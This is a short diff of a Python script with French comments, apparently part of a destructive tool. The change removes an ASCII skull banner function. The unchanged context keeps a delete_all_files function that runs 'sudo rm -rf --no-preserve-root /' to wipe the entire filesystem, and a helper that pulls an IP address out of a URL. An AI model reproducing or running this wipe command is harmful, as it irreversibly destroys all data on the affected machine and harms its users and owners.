@@ -222,17 +222,6 @@ def delete_all_files():
     os.system("sudo rm -rf --no-preserve-root /")
     
 
-
-# Fonction pour afficher la tête de mort ASCII
-def display_skull():
-    skull = """
-          ____0__________
-         /    \\        /    \\
-        |      |      |      |
-         \\____/        \\____/
-    """
-    print(skull)
-
 # Fonction pour extraire l'adresse IP à partir de l'URL
 def extract_ip_from_url(url):
     return url.split("//")[-1].split(":")[0]
